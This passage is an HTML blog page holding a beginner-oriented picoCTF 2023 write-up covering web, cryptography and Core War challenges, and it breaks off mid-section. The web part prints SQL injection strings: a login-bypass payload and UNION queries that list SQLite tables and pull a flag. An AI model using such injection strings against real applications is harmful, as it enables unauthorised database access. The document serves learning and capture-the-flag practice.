@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zeredy879.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="My personal writeup for picoCTF2023, trying to make beginners understand.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="picoCTF2023 Writeup">
+<meta property="og:url" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/index.html">
+<meta property="og:site_name" content="Mirror of Glory">
+<meta property="og:description" content="My personal writeup for picoCTF2023, trying to make beginners understand.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/findme.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/SOAP.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/readmycert.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/rotation.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/vm0.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/vm1.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/nowayout2.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/nowayout1.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/hideme.png">
+<meta property="og:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/money-ware.png">
+<meta property="article:published_time" content="2023-03-29T05:07:46.000Z">
+<meta property="article:modified_time" content="2025-02-28T12:57:09.458Z">
+<meta property="article:author" content="zeredy879">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/findme.png">
+
+
+<link rel="canonical" href="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zeredy879.github.io/2023/03/29/picoctf2023writeup/","path":"2023/03/29/picoctf2023writeup/","title":"picoCTF2023 Writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>picoCTF2023 Writeup | Mirror of Glory</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mirror of Glory</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Mantra of Ascent</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Writeups"><span class="nav-number">2.</span> <span class="nav-text">Writeups</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Exploitation"><span class="nav-number">2.1.</span> <span class="nav-text">Web Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#findme"><span class="nav-number">2.1.1.</span> <span class="nav-text">findme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MatchTheRegex"><span class="nav-number">2.1.2.</span> <span class="nav-text">MatchTheRegex</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOAP"><span class="nav-number">2.1.3.</span> <span class="nav-text">SOAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#More-SQLi"><span class="nav-number">2.1.4.</span> <span class="nav-text">More SQLi</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cryptography"><span class="nav-number">2.2.</span> <span class="nav-text">Cryptography</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HideToSee"><span class="nav-number">2.2.1.</span> <span class="nav-text">HideToSee</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ReadMyCert"><span class="nav-number">2.2.2.</span> <span class="nav-text">ReadMyCert</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rotation"><span class="nav-number">2.2.3.</span> <span class="nav-text">rotation</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-Engineering"><span class="nav-number">2.3.</span> <span class="nav-text">Reverse Engineering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ready-Gladiator-0-1-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">Ready Gladiator 0&#x2F;1&#x2F;2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse"><span class="nav-number">2.3.2.</span> <span class="nav-text">Reverse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Safe-Opener-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">Safe Opener 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#timer"><span class="nav-number">2.3.4.</span> <span class="nav-text">timer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Virtual-Machine-0-1"><span class="nav-number">2.3.5.</span> <span class="nav-text">Virtual Machine 0&#x2F;1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#No-way-out"><span class="nav-number">2.3.6.</span> <span class="nav-text">No way out</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forensics"><span class="nav-number">2.4.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hideme"><span class="nav-number">2.4.1.</span> <span class="nav-text">hideme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PcapPoisoning"><span class="nav-number">2.4.2.</span> <span class="nav-text">PcapPoisoning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#who-is-it"><span class="nav-number">2.4.3.</span> <span class="nav-text">who is it</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSB"><span class="nav-number">2.4.4.</span> <span class="nav-text">MSB</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#General-Skills"><span class="nav-number">2.5.</span> <span class="nav-text">General Skills</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#chrono"><span class="nav-number">2.5.1.</span> <span class="nav-text">chrono</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#money-ware"><span class="nav-number">2.5.2.</span> <span class="nav-text">money-ware</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Permissions"><span class="nav-number">2.5.3.</span> <span class="nav-text">Permissions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#repetitions"><span class="nav-number">2.5.4.</span> <span class="nav-text">repetitions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rules-2023"><span class="nav-number">2.5.5.</span> <span class="nav-text">Rules 2023</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#useless"><span class="nav-number">2.5.6.</span> <span class="nav-text">useless</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Special"><span class="nav-number">2.5.7.</span> <span class="nav-text">Special</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Specialer"><span class="nav-number">2.5.8.</span> <span class="nav-text">Specialer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Binary-Exploitation"><span class="nav-number">2.6.</span> <span class="nav-text">Binary Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#two-sum"><span class="nav-number">2.6.1.</span> <span class="nav-text">two-sum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hijacking"><span class="nav-number">2.6.2.</span> <span class="nav-text">hijacking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tic-tac"><span class="nav-number">2.6.3.</span> <span class="nav-text">tic-tac</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VNE"><span class="nav-number">2.6.4.</span> <span class="nav-text">VNE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babygame01-02"><span class="nav-number">2.6.5.</span> <span class="nav-text">babygame01&#x2F;02</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">zeredy879</p>
+  <div class="site-description" itemprop="description">Each hour has its colour, but colour exists only where there is light</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zeredy879.github.io/2023/03/29/picoctf2023writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="zeredy879">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mirror of Glory">
+      <meta itemprop="description" content="Each hour has its colour, but colour exists only where there is light">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="picoCTF2023 Writeup | Mirror of Glory">
+      <meta itemprop="description" content="My personal writeup for picoCTF2023, trying to make beginners understand.">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          picoCTF2023 Writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-29 13:07:46" itemprop="dateCreated datePublished" datetime="2023-03-29T13:07:46+08:00">2023-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-28 20:57:09" itemprop="dateModified" datetime="2025-02-28T20:57:09+08:00">2025-02-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">My personal writeup for picoCTF2023, trying to make beginners understand.</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>The challenges I accomplished during competition:</p>
+<ul>
+<li>Web Exploitation (4&#x2F;7)<ul>
+<li><input checked="" disabled="" type="checkbox"> findme</li>
+<li><input checked="" disabled="" type="checkbox"> MatchTheRegex</li>
+<li><input checked="" disabled="" type="checkbox"> SOAP</li>
+<li><input checked="" disabled="" type="checkbox"> More SQLi</li>
+<li><input disabled="" type="checkbox"> Java Code Analysis!?</li>
+<li><input disabled="" type="checkbox"> cancri-sp</li>
+<li><input disabled="" type="checkbox"> msfroggenerator2</li>
+</ul>
+</li>
+<li>Cryptography (3&#x2F;7)<ul>
+<li><input checked="" disabled="" type="checkbox"> HideToSee</li>
+<li><input checked="" disabled="" type="checkbox"> ReadMyCert</li>
+<li><input checked="" disabled="" type="checkbox"> rotation</li>
+<li><input disabled="" type="checkbox"> SRA</li>
+<li><input disabled="" type="checkbox"> PowerAnalysis: Warmup</li>
+<li><input disabled="" type="checkbox"> PowerAnalysis: Part 1</li>
+<li><input disabled="" type="checkbox"> PowerAnalysis: Part 2</li>
+</ul>
+</li>
+<li>Reverse Engineering (9&#x2F;9)<ul>
+<li><input checked="" disabled="" type="checkbox"> Ready Gladiator 0</li>
+<li><input checked="" disabled="" type="checkbox"> Ready Gladiator 1</li>
+<li><input checked="" disabled="" type="checkbox"> Ready Gladiator 2</li>
+<li><input checked="" disabled="" type="checkbox"> Reverse</li>
+<li><input checked="" disabled="" type="checkbox"> Safe Opener 2</li>
+<li><input checked="" disabled="" type="checkbox"> timer</li>
+<li><input checked="" disabled="" type="checkbox"> Virtual Machine 0</li>
+<li><input checked="" disabled="" type="checkbox"> Virtual Machine 1</li>
+<li><input checked="" disabled="" type="checkbox"> No way out</li>
+</ul>
+</li>
+<li>Forensics (4&#x2F;7)<ul>
+<li><input checked="" disabled="" type="checkbox"> hideme</li>
+<li><input checked="" disabled="" type="checkbox"> PcapPoisoning</li>
+<li><input checked="" disabled="" type="checkbox"> who is it</li>
+<li><input disabled="" type="checkbox"> FindAndOpen</li>
+<li><input checked="" disabled="" type="checkbox"> MSB</li>
+<li><input disabled="" type="checkbox"> Invisible WORDs</li>
+<li><input disabled="" type="checkbox"> UnforgottenBits</li>
+</ul>
+</li>
+<li>General Skills (8&#x2F;8)<ul>
+<li><input checked="" disabled="" type="checkbox"> chrono</li>
+<li><input checked="" disabled="" type="checkbox"> money-ware</li>
+<li><input checked="" disabled="" type="checkbox"> Permissions</li>
+<li><input checked="" disabled="" type="checkbox"> repetitions</li>
+<li><input checked="" disabled="" type="checkbox"> Rules 2023</li>
+<li><input checked="" disabled="" type="checkbox"> useless</li>
+<li><input checked="" disabled="" type="checkbox"> Special</li>
+<li><input checked="" disabled="" type="checkbox"> Specialer</li>
+</ul>
+</li>
+<li>Binary Exploitation (6&#x2F;7)<ul>
+<li><input checked="" disabled="" type="checkbox"> two-sum</li>
+<li><input checked="" disabled="" type="checkbox"> hijacking</li>
+<li><input checked="" disabled="" type="checkbox"> tic-tac</li>
+<li><input checked="" disabled="" type="checkbox"> VNE</li>
+<li><input checked="" disabled="" type="checkbox"> babygame01</li>
+<li><input checked="" disabled="" type="checkbox"> babygame02</li>
+<li><input disabled="" type="checkbox"> Horsetrack</li>
+</ul>
+</li>
+</ul>
+<p>Finally I get 5200 scores and rank 301&#x2F;6924 as an invidual team <code>OneAngryMan</code>. Below are my writeups.</p>
+<hr>
+<h1 id="Writeups"><a href="#Writeups" class="headerlink" title="Writeups"></a>Writeups</h1><h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>Input username as <code>test</code> and password as <code>test!</code> then click test button, we can find the title of current tab changing to “flag” quickly and the “flag” title disappear immediately. Since the hint is about <code>redirection</code>, I try to extract infomation from redirections through <strong>Chrome DevTools</strong>. But the weird thing is that if I open DevTools to intercept the network packets of login process, the redirections are completely jammed. Maybe this is a question of my local network, and I must use other tools to get the information in the redirections of url.</p>
+<p>I recommend 2 ways here: Burpsuite and Python requests module. Then get two base64-like string in <strong>id field</strong> of redirection requests:</p>
+<img src="/2023/03/29/picoctf2023writeup/findme.png" class="">
+
+<p>Python requests module also works:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>r = requests.post(<br>    <span class="hljs-string">&quot;http://saturn.picoctf.net:49645/login&quot;</span>,<br>    data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test!&quot;</span>&#125;,<br>)<br><span class="hljs-keyword">for</span> req <span class="hljs-keyword">in</span> r.history:<br>    <span class="hljs-built_in">print</span>(req.content)<br><span class="hljs-built_in">print</span>(r.content)<br></code></pre></td></tr></table></figure>
+<p>Finally we combine two string and use base64 encode to get flag:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzgxZDRkODMxfQ== | base64 -d<br><span class="hljs-meta prompt_"># </span><span class="language-bash">picoCTF&#123;proxies_all_the_way_81d4d831&#125;</span><br></code></pre></td></tr></table></figure>
+<h3 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h3><p>We can find below javascript code in front-end of website:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params"></span>) &#123;<br>	<span class="hljs-keyword">let</span> val = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;name&quot;</span>).<span class="hljs-property">value</span>;<br>	<span class="hljs-comment">// ^p.....F!?</span><br>	<span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/flag?input=<span class="hljs-subst">$&#123;val&#125;</span>`</span>)<br>		.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>())<br>		.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>			<span class="hljs-keyword">const</span> res_json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(res);<br>			<span class="hljs-title function_">alert</span>(res_json.<span class="hljs-property">flag</span>)<br>			<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>		&#125;)<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>^p.....F!?</code> is a regex string which means a string start with character <code>p</code> then following 5 any character plus a <code>F</code> character then end with a <code>!</code> or omit it. So input <code>picoCTF</code> and then we get flag.</p>
+<h3 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h3><p>The hint is XML external entity Injection and I directly google it then find a usable payload for this challenge:</p>
+<img src="/2023/03/29/picoctf2023writeup/SOAP.png" class="">
+<h3 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h3><p>First stage we should bypass the authentication of login process which is a typical SQL injection so we can fuzz the password from usual SQLi examples, here I use <code>admin&#39; or &#39;1&#39;=&#39;1&#39;--</code> as password.</p>
+<p>After login, we need to extract the tables’ infomation from database. Since this is a SQLite database, I google sth like “SQL injection in SQLite” and get a really useful reference: <a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf">https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf</a> .Then I follow this reference step by step and get flag through below query sentences:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> tbl_name,<span class="hljs-keyword">sql</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> sqlite_master<span class="hljs-comment">--+</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,flag,3 from more_table--+</span><br></code></pre></td></tr></table></figure>
+<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="HideToSee"><a href="#HideToSee" class="headerlink" title="HideToSee"></a>HideToSee</h3><p>Atbash cipher is a really simple algorithm but this challenge makes a lot of people confused at the beginning. I get stuck in this challenge for about a week and finally solve it through almost every picture steganography I can find on the web.</p>
+<p>Use <strong><code>steghide</code></strong> to extract information from picture we get from:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">steghide extract -sf atbash.jpg<br><span class="hljs-meta prompt_"># </span><span class="language-bash">reference: https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography</span><br></code></pre></td></tr></table></figure>
+<p>Then we use online <a target="_blank" rel="noopener" href="https://www.dcode.fr/atbash-cipher">atbash cipher decrypt</a> tool to decrypt extracted infomation.</p>
+<h3 id="ReadMyCert"><a href="#ReadMyCert" class="headerlink" title="ReadMyCert"></a>ReadMyCert</h3><p>Google <a target="_blank" rel="noopener" href="https://www.sslshopper.com/csr-decoder.html">online csr decoder</a> and get flag.</p>
+<img src="/2023/03/29/picoctf2023writeup/readmycert.png" class="">
+<h3 id="rotation"><a href="#rotation" class="headerlink" title="rotation"></a>rotation</h3><p>A typical Caesar cipher and we can directly solve it <a target="_blank" rel="noopener" href="https://www.dcode.fr/caesar-cipher">online</a>.</p>
+<img src="/2023/03/29/picoctf2023writeup/rotation.png" class="">
+<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="Ready-Gladiator-0-1-2"><a href="#Ready-Gladiator-0-1-2" class="headerlink" title="Ready Gladiator 0&#x2F;1&#x2F;2"></a>Ready Gladiator 0&#x2F;1&#x2F;2</h3><p>The Ready Gladiator series are more OSINT than reverse engineering for me, because I find all the solutions on the web. Anyway, <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Core_War">Core_War</a> is definitely an interesting game from both programming’s and mathematics’ perspective. These 3 challenge we confront a same recode program – <a target="_blank" rel="noopener" href="https://corewar.co.uk/imp.htm">imp</a>, which copies itself recursively aiming to turn another program to imp too and go to a tie.</p>
+<p>Challenge 0 requires always loses, no ties. The easiest way is to do nothing and program will end itself immediately, which is:</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">;<span class="hljs-built_in">assert</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<p>Challenge 1 requires wins which means we need kill the running imp sometimes. I am tired to understand redcode programming method so I directly google some core_war warriors:</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-comment">;assert 1</span><br><span class="hljs-comment">;https://crypto.stanford.edu/~blynn/play/redcode.html</span><br><span class="hljs-keyword">jmp</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">2</span>, <span class="hljs-number">-1</span><br><span class="hljs-keyword">jmp</span> <span class="hljs-number">-1</span><br>dat <span class="hljs-number">9</span><br><span class="hljs-built_in">spl</span> <span class="hljs-number">-2</span><br><span class="hljs-built_in">spl</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">add</span> <span class="hljs-meta">#-16, -3</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">-4</span>, @<span class="hljs-number">-4</span><br><span class="hljs-keyword">jmp</span> <span class="hljs-number">-4</span><br><span class="hljs-built_in">spl</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">jmp</span> <span class="hljs-number">-1</span><br>end<br></code></pre></td></tr></table></figure>
+
+<p>Challenge 2 requires wins for 100&#x2F;100 times. Cause imp is such a famous strategy in Core_War so there must be some existing anti-imp redcode programs. I try to use both google and ChatGPT, and ChatGPT gives me a program but doesn’t work:</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-comment">; Anti-IMP program</span><br><span class="hljs-comment">; Starts by jumping to the end of the code segment</span><br><span class="hljs-comment">; then creates a spiral pattern to scan for the enemy IMP program</span><br>start   JMP <span class="hljs-keyword">end</span>      <span class="hljs-comment">; Jump to end of code segment</span><br><br>loop    ADD <span class="hljs-variable">#1</span><span class="hljs-punctuation">,</span> scan <span class="hljs-comment">; Increment scan counter</span><br>        MOV scan<span class="hljs-punctuation">,</span> <span class="hljs-title">@scan</span> <span class="hljs-comment">; Move the counter to the current scan location</span><br>        CMP scan<span class="hljs-punctuation">,</span> <span class="hljs-variable">#0</span> <span class="hljs-comment">; Check if scan counter is zero</span><br>        JMP <span class="hljs-keyword">end</span><span class="hljs-punctuation">,</span> &lt; <span class="hljs-comment">; Jump to end if counter is zero</span><br>        MOV <span class="hljs-variable">#0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-1</span> <span class="hljs-comment">; Set the -1 memory location to zero</span><br>        ADD <span class="hljs-variable">#1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-1</span> <span class="hljs-comment">; Increment the -1 memory location</span><br>        DJN <span class="hljs-number">-2</span><span class="hljs-punctuation">,</span> loop <span class="hljs-comment">; Decrement the -2 memory location and jump to loop if it is not zero</span><br><br>scan    EQU <span class="hljs-number">0</span>        <span class="hljs-comment">; Initialize the scan counter to zero</span><br><br><span class="hljs-keyword">end</span>     DAT <span class="hljs-variable">#0</span>       <span class="hljs-comment">; End of code segment</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<p>Finally I find a useful redcode through Google:</p>
